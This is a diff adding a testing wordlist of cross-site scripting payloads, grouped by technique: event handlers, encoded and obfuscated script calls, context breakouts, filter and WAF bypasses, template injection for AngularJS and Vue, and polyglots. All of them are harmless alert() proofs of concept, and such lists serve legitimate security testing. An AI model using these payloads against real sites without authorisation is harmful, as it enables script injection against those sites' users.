@@ -1,0 +1,106 @@
+# XSS Payloads for Testing
+# Basic XSS payloads
+
+<script>alert('XSS')</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>alert(/XSS/)</script>
+<script>alert`XSS`</script>
+<script>prompt('XSS')</script>
+<script>confirm('XSS')</script>
+
+# Event handlers
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+<select onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+<keygen onfocus=alert('XSS') autofocus>
+<video onloadstart=alert('XSS')><source>
+<audio onloadstart=alert('XSS')><source>
+<details open ontoggle=alert('XSS')>
+
+# HTML5 elements
+<math><maction actiontype=toggle xlink:href=javascript:alert('XSS')>CLICKME</maction></math>
+<svg><animate xlink:href=#x attributeName=href values=javascript:alert('XSS') />
+<a id=x><text>CLICKME</text></a>
+
+# JavaScript alternatives
+<script>eval('alert("XSS")')</script>
+<script>Function('alert("XSS")')();</script>
+<script>setTimeout('alert("XSS")',1)</script>
+<script>setInterval('alert("XSS")',1)</script>
+<script>new Function('alert("XSS")')();</script>
+
+# Encoded payloads
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>alert('\x58\x53\x53')</script>
+<script>alert('\u0058\u0053\u0053')</script>
+
+# Context-specific payloads
+';alert('XSS');//
+";alert('XSS');//
+</script><script>alert('XSS')</script>
+'-alert('XSS')-'
+"-alert('XSS')-"
+javascript:alert('XSS')
+data:text/html,<script>alert('XSS')</script>
+
+# Filter bypass
+<svg/onload=alert('XSS')>
+<img src="x" onerror="alert('XSS')">
+<iframe src=javascript:alert('XSS')>
+<embed src=javascript:alert('XSS')>
+<object data=javascript:alert('XSS')>
+<form><button formaction=javascript:alert('XSS')>
+<isindex action=javascript:alert('XSS') type=submit>
+<input type=submit formaction=javascript:alert('XSS') value=X>
+
+# DOM manipulation
+<script>document.body.innerHTML='<img src=x onerror=alert("XSS")>'</script>
+<script>document.write('<img src=x onerror=alert("XSS")>')</script>
+<script>document.createElement('img').onerror=alert('XSS')</script>
+
+# Advanced payloads
+<script>top['al'+'ert']('XSS')</script>
+<script>top[/al/.source+/ert/.source]('XSS')</script>
+<script>(alert)('XSS')</script>
+<script>a=alert,a('XSS')</script>
+<script>[]['find']['constructor']('alert("XSS")')();</script>
+
+# AngularJS payloads
+{{constructor.constructor('alert("XSS")')()}}
+{{$on.constructor('alert("XSS")')()}}
+<div ng-app ng-csp>{{$eval.constructor('alert("XSS")')()}}</div>
+
+# VueJS payloads
+{{constructor.constructor('alert("XSS")')()}}
+{{this.constructor.constructor('alert("XSS")')()}}
+
+# React payloads
+<img src="x" onerror={alert('XSS')} />
+
+# Polyglot payloads
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+'"--></style></script><script>alert('XSS')</script>
+
+# WAF bypass payloads
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=alert('XSS') />
+<svg><script>alert&#40;'XSS'&#41;</script>
+<iframe src="javascript:alert('XSS')"></iframe>
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
+
+# Length limitations bypass
+<q oncut=alert('XSS')>
+<input oncut=alert('XSS')>
+<keygen onfocus=alert('XSS') autofocus>
+<marquee onstart=alert('XSS')>
+<meter onmouseover=alert('XSS') value=2 min=0 max=10>
+<progress onmouseover=alert('XSS') value=10 max=100>
+
+# Special characters
+<script>alert('XSS')</script>
+<script>alert("XSS")</script>
+<script>alert`XSS`</script>
+<script>alert(String.raw`XSS`)</script>
